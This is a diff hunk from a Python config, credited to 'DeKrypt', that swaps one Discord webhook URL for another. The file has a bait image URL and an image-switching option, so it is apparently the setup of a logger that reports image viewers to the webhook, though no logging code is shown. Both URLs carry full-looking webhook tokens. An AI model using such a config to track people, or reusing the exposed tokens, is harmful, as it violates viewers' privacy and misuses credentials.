@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1340725566806167642/ME-rtcpjBs8r16DU4HOglkeSClXYoSQG-SipsfsuxX3txWRUJXLW6tdX7jLqE-Xpu7sF",
+    "webhook": "https://discord.com/api/webhooks/1340725563643527250/7-ELnNqAkYMF25O_r2znmK0uVW1cDSbd9gjAUjHK2ME4-SeNPDJHettL8JVl_32FO9do",
     "image": "https://openautomationsoftware.com/wp-content/uploads/2016/07/JSON-icon-2.jpg"
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
